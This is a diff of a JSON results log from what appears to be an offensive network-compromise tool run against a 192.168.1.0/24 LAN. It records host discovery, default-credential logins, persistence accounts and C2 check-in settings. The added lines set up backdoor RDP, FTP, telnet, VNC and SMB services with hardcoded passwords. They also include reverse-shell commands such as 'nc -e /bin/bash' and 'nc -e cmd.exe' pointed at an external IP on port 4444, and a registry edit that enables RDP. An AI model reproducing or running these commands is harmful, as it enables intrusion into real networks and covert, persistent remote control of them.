@@ -2,13 +2,13 @@
     "metadata": {
       "script_name": "SimplifyWFB",
       "version": "1.0.0",
-      "start_time": "2025-09-08T12:41:31.662814",
+      "start_time": "2025-09-08T13:56:00.547090",
       "mode": "cold",
       "target_network": "192.168.1.0/24",
       "local_ip": "192.168.1.17",
       "external_ip": "212.95.62.135",
       "external_port": 4444,
-      "end_time": "2025-09-08T12:47:18.115164"
+      "end_time": "2025-09-08T14:04:53.896214"
     },
     "phase_1_reconnaissance": {
       "status": "error",
@@ -18,70 +18,56 @@
           "mac": null,
           "vendor": null,
           "status": "up",
-          "discovery_method": "nmap_ping"
+          "discovery_method": "ping"
         },
         {
           "ip": "192.168.1.3",
           "mac": null,
           "vendor": null,
           "status": "up",
-          "discovery_method": "nmap_ping"
+          "discovery_method": "ping"
         },
         {
           "ip": "192.168.1.4",
           "mac": null,
           "vendor": null,
           "status": "up",
-          "discovery_method": "nmap_ping"
+          "discovery_method": "ping"
         },
         {
           "ip": "192.168.1.5",
           "mac": null,
           "vendor": null,
           "status": "up",
-          "discovery_method": "nmap_ping"
+          "discovery_method": "ping"
         },
         {
-          "ip": "192.168.1.8",
+          "ip": "192.168.1.6",
           "mac": null,
           "vendor": null,
           "status": "up",
-          "discovery_method": "nmap_ping"
+          "discovery_method": "ping"
         },
         {
           "ip": "192.168.1.9",
           "mac": null,
           "vendor": null,
           "status": "up",
-          "discovery_method": "nmap_ping"
-        },
-        {
-          "ip": "192.168.1.10",
-          "mac": null,
-          "vendor": null,
-          "status": "up",
-          "discovery_method": "nmap_ping"
-        },
-        {
-          "ip": "192.168.1.11",
-          "mac": null,
-          "vendor": null,
-          "status": "up",
-          "discovery_method": "nmap_ping"
+          "discovery_method": "ping"
         },
         {
           "ip": "192.168.1.12",
           "mac": null,
           "vendor": null,
           "status": "up",
-          "discovery_method": "nmap_ping"
+          "discovery_method": "ping"
         },
         {
           "ip": "192.168.1.17",
           "mac": null,
           "vendor": null,
           "status": "up",
-          "discovery_method": "nmap_ping"
+          "discovery_method": "ping"
         }
       ],
       "services_found": [
@@ -108,22 +94,6 @@
           "state": "open",
           "service": "http",
           "version": "Mini web server 1.0 (ZTE ZXV10 W300 ADSL router http config)"
-        },
-        {
-          "host": "192.168.1.8",
-          "port": 3306,
-          "protocol": "tcp",
-          "state": "open",
-          "service": "tcpwrapped",
-          "version": "unknown"
-        },
-        {
-          "host": "192.168.1.11",
-          "port": 3306,
-          "protocol": "tcp",
-          "state": "open",
-          "service": "mysql",
-          "version": "MySQL 8.0.34"
         },
         {
           "host": "192.168.1.17",
@@ -157,20 +127,6 @@
           "confidence": "high"
         },
         {
-          "host": "192.168.1.8",
-          "port": 3306,
-          "technology": "tcpwrapped",
-          "version": "unknown",
-          "confidence": "medium"
-        },
-        {
-          "host": "192.168.1.11",
-          "port": 3306,
-          "technology": "mysql",
-          "version": "MySQL 8.0.34",
-          "confidence": "high"
-        },
-        {
           "host": "192.168.1.17",
           "port": 22,
           "technology": "ssh",
@@ -197,16 +153,14 @@
         "network_segments": [
           {
             "network_base": "192.168.1.0/24",
-            "hosts_count": 10,
+            "hosts_count": 8,
             "hosts": [
               "192.168.1.1",
               "192.168.1.3",
               "192.168.1.4",
               "192.168.1.5",
-              "192.168.1.8",
+              "192.168.1.6",
               "192.168.1.9",
-              "192.168.1.10",
-              "192.168.1.11",
               "192.168.1.12",
               "192.168.1.17"
             ],
@@ -236,226 +190,100 @@
           "host": "192.168.1.1",
           "port": 21,
           "service": "ftp",
-          "username": "admin",
+          "username": "guest",
+          "password": "123456",
+          "method": "default_credentials",
+          "timestamp": 1757354664.3775818
+        },
+        {
+          "host": "192.168.1.1",
+          "port": 21,
+          "service": "ftp",
+          "username": "user",
           "password": "guest",
           "method": "default_credentials",
-          "timestamp": 1757350020.7845705
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 21,
-          "service": "ftp",
-          "username": "administrator",
-          "password": "123456",
-          "method": "default_credentials",
-          "timestamp": 1757350020.784576
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 21,
-          "service": "ftp",
-          "username": "root",
-          "password": "admin",
-          "method": "default_credentials",
-          "timestamp": 1757350020.7845774
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 21,
-          "service": "ftp",
-          "username": "guest",
-          "password": "root",
-          "method": "default_credentials",
-          "timestamp": 1757350020.7845793
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 21,
-          "service": "ftp",
-          "username": "user",
-          "password": "admin",
-          "method": "default_credentials",
-          "timestamp": 1757350020.7845805
+          "timestamp": 1757354664.3775902
         },
         {
           "host": "192.168.1.1",
           "port": 23,
           "service": "telnet",
-          "username": "admin",
+          "username": "guest",
+          "password": "123456",
+          "method": "default_credentials",
+          "timestamp": 1757354664.3776052
+        },
+        {
+          "host": "192.168.1.1",
+          "port": 23,
+          "service": "telnet",
+          "username": "user",
           "password": "guest",
           "method": "default_credentials",
-          "timestamp": 1757350020.7845826
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 23,
-          "service": "telnet",
-          "username": "administrator",
-          "password": "123456",
-          "method": "default_credentials",
-          "timestamp": 1757350020.7845845
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 23,
-          "service": "telnet",
-          "username": "root",
-          "password": "admin",
-          "method": "default_credentials",
-          "timestamp": 1757350020.784585
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 23,
-          "service": "telnet",
-          "username": "guest",
-          "password": "root",
-          "method": "default_credentials",
-          "timestamp": 1757350020.7845864
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 23,
-          "service": "telnet",
-          "username": "user",
-          "password": "admin",
-          "method": "default_credentials",
-          "timestamp": 1757350020.7845876
+          "timestamp": 1757354664.3776093
         },
         {
           "host": "192.168.1.1",
           "port": 80,
           "service": "http",
-          "username": "admin",
+          "username": "guest",
+          "password": "123456",
+          "method": "default_credentials",
+          "timestamp": 1757354664.3776212
+        },
+        {
+          "host": "192.168.1.1",
+          "port": 80,
+          "service": "http",
+          "username": "user",
           "password": "guest",
           "method": "default_credentials",
-          "timestamp": 1757350020.7845893
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 80,
-          "service": "http",
-          "username": "administrator",
-          "password": "123456",
-          "method": "default_credentials",
-          "timestamp": 1757350020.7845902
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 80,
-          "service": "http",
-          "username": "root",
-          "password": "admin",
-          "method": "default_credentials",
-          "timestamp": 1757350020.784591
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 80,
-          "service": "http",
-          "username": "guest",
-          "password": "root",
-          "method": "default_credentials",
-          "timestamp": 1757350020.784592
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 80,
-          "service": "http",
-          "username": "user",
-          "password": "admin",
-          "method": "default_credentials",
-          "timestamp": 1757350020.7845926
-        },
-        {
-          "host": "192.168.1.8",
-          "port": 3306,
-          "service": "tcpwrapped",
-          "username": "admin",
-          "password": "admin",
-          "method": "default_credentials",
-          "timestamp": 1757350020.7845936
-        },
-        {
-          "host": "192.168.1.8",
-          "port": 3306,
-          "service": "tcpwrapped",
-          "username": "administrator",
-          "password": "admin",
-          "method": "default_credentials",
-          "timestamp": 1757350020.7845945
-        },
-        {
-          "host": "192.168.1.8",
-          "port": 3306,
-          "service": "tcpwrapped",
-          "username": "root",
-          "password": "admin",
-          "method": "default_credentials",
-          "timestamp": 1757350020.784595
-        },
-        {
-          "host": "192.168.1.8",
-          "port": 3306,
-          "service": "tcpwrapped",
-          "username": "user",
-          "password": "",
-          "method": "default_credentials",
-          "timestamp": 1757350020.7845986
-        },
-        {
-          "host": "192.168.1.11",
-          "port": 3306,
-          "service": "mysql",
-          "username": "administrator",
-          "password": "admin",
-          "method": "default_credentials",
-          "timestamp": 1757350020.784602
-        },
-        {
-          "host": "192.168.1.11",
-          "port": 3306,
-          "service": "mysql",
-          "username": "root",
-          "password": "root",
-          "method": "default_credentials",
-          "timestamp": 1757350020.7846034
-        },
-        {
-          "host": "192.168.1.11",
-          "port": 3306,
-          "service": "mysql",
-          "username": "guest",
-          "password": "123456",
-          "method": "default_credentials",
-          "timestamp": 1757350020.7846048
-        },
-        {
-          "host": "192.168.1.11",
-          "port": 3306,
-          "service": "mysql",
-          "username": "user",
-          "password": "admin",
-          "method": "default_credentials",
-          "timestamp": 1757350020.7846053
+          "timestamp": 1757354664.3776252
         },
         {
           "host": "192.168.1.17",
           "port": 22,
           "service": "ssh",
           "username": "admin",
+          "password": "admin",
+          "method": "default_credentials",
+          "timestamp": 1757354664.3776276
+        },
+        {
+          "host": "192.168.1.17",
+          "port": 22,
+          "service": "ssh",
+          "username": "administrator",
           "password": "123456",
           "method": "default_credentials",
-          "timestamp": 1757350020.7846067
+          "timestamp": 1757354664.3776302
+        },
+        {
+          "host": "192.168.1.17",
+          "port": 22,
+          "service": "ssh",
+          "username": "root",
+          "password": "root",
+          "method": "default_credentials",
+          "timestamp": 1757354664.3776336
+        },
+        {
+          "host": "192.168.1.17",
+          "port": 22,
+          "service": "ssh",
+          "username": "guest",
+          "password": "guest",
+          "method": "default_credentials",
+          "timestamp": 1757354664.3776376
         },
         {
           "host": "192.168.1.17",
           "port": 22,
           "service": "ssh",
           "username": "user",
-          "password": "password",
+          "password": "admin",
           "method": "default_credentials",
-          "timestamp": 1757350020.7846122
+          "timestamp": 1757354664.3776395
         },
         {
           "host": "192.168.1.100",
@@ -464,7 +292,7 @@
           "username": "user",
           "password": "password123",
           "method": "sniffing",
-          "timestamp": 1757350020.784631
+          "timestamp": 1757354664.3776927
         }
       ],
       "attack_methods_used": [],
@@ -477,46 +305,19 @@
           "host": "192.168.1.1",
           "port": 80,
           "service": "http",
-          "username": "admin",
-          "password": "guest",
-          "access_level": "user",
-          "timestamp": 1757350025.9664652
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 80,
-          "service": "http",
-          "username": "administrator",
+          "username": "guest",
           "password": "123456",
           "access_level": "user",
-          "timestamp": 1757350026.0022182
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 80,
-          "service": "http",
-          "username": "root",
-          "password": "admin",
-          "access_level": "user",
-          "timestamp": 1757350026.0384126
-        },
-        {
-          "host": "192.168.1.1",
-          "port": 80,
-          "service": "http",
-          "username": "guest",
-          "password": "root",
-          "access_level": "user",
-          "timestamp": 1757350026.0790825
+          "timestamp": 1757354666.6175516
         },
         {
           "host": "192.168.1.1",
           "port": 80,
           "service": "http",
           "username": "user",
-          "password": "admin",
+          "password": "guest",
           "access_level": "user",
-          "timestamp": 1757350026.1166623
+          "timestamp": 1757354666.6625896
         }
       ],
       "access_methods": [],
@@ -526,35 +327,14 @@
           "to_hosts": [],
           "connection_type": "ssh",
           "established": true,
-          "timestamp": 1757350034.9497685
+          "timestamp": 1757354687.3978598
         },
         {
           "from_host": "192.168.1.1",
           "to_hosts": [],
           "connection_type": "ssh",
           "established": true,
-          "timestamp": 1757350034.949777
-        },
-        {
-          "from_host": "192.168.1.1",
-          "to_hosts": [],
-          "connection_type": "ssh",
-          "established": true,
-          "timestamp": 1757350034.9497802
-        },
-        {
-          "from_host": "192.168.1.1",
-          "to_hosts": [],
-          "connection_type": "ssh",
-          "established": true,
-          "timestamp": 1757350034.9497817
-        },
-        {
-          "from_host": "192.168.1.1",
-          "to_hosts": [],
-          "connection_type": "ssh",
-          "established": true,
-          "timestamp": 1757350034.949783
+          "timestamp": 1757354687.3978727
         }
       ],
       "errors": [],
@@ -574,7 +354,7 @@
           "password": "P@ssw0rd_1!",
           "persistent": true,
           "auto_reconnect": true,
-          "timestamp": 1757350036.558866
+          "timestamp": 1757354689.5001862
         },
         {
           "host": "192.168.1.1",
@@ -584,37 +364,7 @@
           "password": "P@ssw0rd_1!",
           "persistent": true,
           "auto_reconnect": true,
-          "timestamp": 1757350036.5588753
-        },
-        {
-          "host": "192.168.1.1",
-          "type": "ssh",
-          "port": 22,
-          "username": "svc_192_168_1_1",
-          "password": "P@ssw0rd_1!",
-          "persistent": true,
-          "auto_reconnect": true,
-          "timestamp": 1757350036.558879
-        },
-        {
-          "host": "192.168.1.1",
-          "type": "ssh",
-          "port": 22,
-          "username": "svc_192_168_1_1",
-          "password": "P@ssw0rd_1!",
-          "persistent": true,
-          "auto_reconnect": true,
-          "timestamp": 1757350036.5588815
-        },
-        {
-          "host": "192.168.1.1",
-          "type": "ssh",
-          "port": 22,
-          "username": "svc_192_168_1_1",
-          "password": "P@ssw0rd_1!",
-          "persistent": true,
-          "auto_reconnect": true,
-          "timestamp": 1757350036.558884
+          "timestamp": 1757354689.5002005
         }
       ],
       "c2_pointers": [
@@ -625,7 +375,7 @@
           "checkin_interval": 300,
           "method": "http_post",
           "encrypted": true,
-          "timestamp": 1757350036.5588963
+          "timestamp": 1757354689.5002193
         },
         {
           "host": "192.168.1.1",
@@ -634,34 +384,7 @@
           "checkin_interval": 300,
           "method": "http_post",
           "encrypted": true,
-          "timestamp": 1757350036.5589
-        },
-        {
-          "host": "192.168.1.1",
-          "c2_server": "192.168.1.200",
-          "c2_port": 8080,
-          "checkin_interval": 300,
-          "method": "http_post",
-          "encrypted": true,
-          "timestamp": 1757350036.5589018
-        },
-        {
-          "host": "192.168.1.1",
-          "c2_server": "192.168.1.200",
-          "c2_port": 8080,
-          "checkin_interval": 300,
-          "method": "http_post",
-          "encrypted": true,
-          "timestamp": 1757350036.558903
-        },
-        {
-          "host": "192.168.1.1",
-          "c2_server": "192.168.1.200",
-          "c2_port": 8080,
-          "checkin_interval": 300,
-          "method": "http_post",
-          "encrypted": true,
-          "timestamp": 1757350036.5589037
+          "timestamp": 1757354689.5002248
         }
       ],
       "cameras_accessed": [],
@@ -680,7 +403,7 @@
             "admin_user_created": false,
             "backup_config": null
           },
-          "timestamp": 1757350038.1146543
+          "timestamp": 1757354693.8922083
         }
       ],
       "network_persistence": [
@@ -744,6 +467,108 @@
           ],
           "reverse_proxy": "nc -e /bin/bash 212.95.62.135 4444",
           "persistent_web": "python3 -m http.server 8080 --bind 0.0.0.0"
+        },
+        {
+          "service": "rdp",
+          "port": 3389,
+          "enabled": true,
+          "users": [
+            {
+              "username": "svc_rdp",
+              "password": "RDP_P@ssw0rd_2024!",
+              "privileges": "administrator"
+            }
+          ],
+          "access_methods": [
+            "xfreerdp /v:212.95.62.135:3389 /u:svc_rdp /p:RDP_P@ssw0rd_2024!",
+            "rdesktop 212.95.62.135:3389 -u svc_rdp -p RDP_P@ssw0rd_2024!",
+            "mstsc /v:212.95.62.135:3389"
+          ],
+          "reverse_connection": "nc -e cmd.exe 212.95.62.135 4444",
+          "persistent_rdp": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+        },
+        {
+          "service": "ftp",
+          "port": 21,
+          "enabled": true,
+          "users": [
+            {
+              "username": "svc_ftp",
+              "password": "FTP_P@ssw0rd_2024!",
+              "home_directory": "/home/ftp",
+              "permissions": "full"
+            }
+          ],
+          "access_methods": [
+            "ftp 212.95.62.135 21",
+            "curl ftp://svc_ftp:FTP_P@ssw0rd_2024!@212.95.62.135:21/",
+            "wget ftp://svc_ftp:FTP_P@ssw0rd_2024!@212.95.62.135:21/"
+          ],
+          "reverse_connection": "nc -e /bin/bash 212.95.62.135 4444",
+          "persistent_ftp": "vsftpd -o listen=21 -o anonymous_enable=NO"
+        },
+        {
+          "service": "telnet",
+          "port": 23,
+          "enabled": true,
+          "users": [
+            {
+              "username": "svc_telnet",
+              "password": "Telnet_P@ssw0rd_2024!",
+              "shell": "/bin/bash"
+            }
+          ],
+          "access_methods": [
+            "telnet 212.95.62.135 23",
+            "nc 212.95.62.135 23",
+            "openssl s_client -connect 212.95.62.135:23"
+          ],
+          "reverse_connection": "nc -e /bin/bash 212.95.62.135 4444",
+          "persistent_telnet": "telnetd -l /bin/bash -p 23"
+        },
+        {
+          "service": "vnc",
+          "port": 5900,
+          "enabled": true,
+          "users": [
+            {
+              "username": "svc_vnc",
+              "password": "VNC_P@ssw0rd_2024!",
+              "display": ":1"
+            }
+          ],
+          "access_methods": [
+            "vncviewer 212.95.62.135:5900",
+            "remmina vnc://212.95.62.135:5900",
+            "tigervnc 212.95.62.135:5900"
+          ],
+          "reverse_connection": "nc -e /bin/bash 212.95.62.135 4444",
+          "persistent_vnc": "vncserver :1 -geometry 1024x768 -depth 16"
+        },
+        {
+          "service": "smb",
+          "port": 445,
+          "enabled": true,
+          "shares": [
+            {
+              "name": "backdoor_share",
+              "path": "/home/smb",
+              "permissions": "full",
+              "users": [
+                {
+                  "username": "svc_smb",
+                  "password": "SMB_P@ssw0rd_2024!"
+                }
+              ]
+            }
+          ],
+          "access_methods": [
+            "smbclient //212.95.62.135/backdoor_share -U svc_smb%SMB_P@ssw0rd_2024!",
+            "mount -t cifs //212.95.62.135/backdoor_share /mnt/smb -o username=svc_smb,password=SMB_P@ssw0rd_2024!",
+            "net use \\\\212.95.62.135\\backdoor_share /user:svc_smb SMB_P@ssw0rd_2024!"
+          ],
+          "reverse_connection": "nc -e /bin/bash 212.95.62.135 4444",
+          "persistent_smb": "smbd -D -p 445"
         }
       ],
       "errors": [],
@@ -759,7 +584,7 @@
           "port": 22,
           "status": "connected",
           "verified": true,
-          "timestamp": 1757350038.1150405
+          "timestamp": 1757354693.8957665
         },
         {
           "type": "connection_verification",
@@ -767,31 +592,7 @@
           "port": 22,
           "status": "connected",
           "verified": true,
-          "timestamp": 1757350038.115043
-        },
-        {
-          "type": "connection_verification",
-          "host": "192.168.1.1",
-          "port": 22,
-          "status": "connected",
-          "verified": true,
-          "timestamp": 1757350038.1150537
-        },
-        {
-          "type": "connection_verification",
-          "host": "192.168.1.1",
-          "port": 22,
-          "status": "connected",
-          "verified": true,
-          "timestamp": 1757350038.1150544
-        },
-        {
-          "type": "connection_verification",
-          "host": "192.168.1.1",
-          "port": 22,
-          "status": "connected",
-          "verified": true,
-          "timestamp": 1757350038.1150548
+          "timestamp": 1757354693.8957765
         }
       ],
       "errors": []
@@ -802,16 +603,23 @@
       "errors": []
     },
     "summary": {
-      "total_hosts": 10,
-      "compromised_hosts": 5,
+      "total_hosts": 8,
+      "compromised_hosts": 2,
       "persistent_access_points": 0,
-      "total_credentials": 26,
-      "execution_time": 346.45245265960693,
-      "success_rate": 50.0,
+      "total_credentials": 12,
+      "execution_time": 533.3492810726166,
+      "success_rate": 25.0,
       "cameras_accessed": 0,
       "router_access": 1,
-      "network_services": 3,
-      "total_remote_access_points": 4,
+      "network_services": 8,
+      "total_remote_access_points": 9,
+      "external_backdoors": 9,
+      "internal_backdoors": 0,
+      "external_backdoor_types": [
+        "Router Access (1)",
+        "Network Services (8)"
+      ],
+      "internal_backdoor_types": [],
       "remote_access_available": true
     }
   }
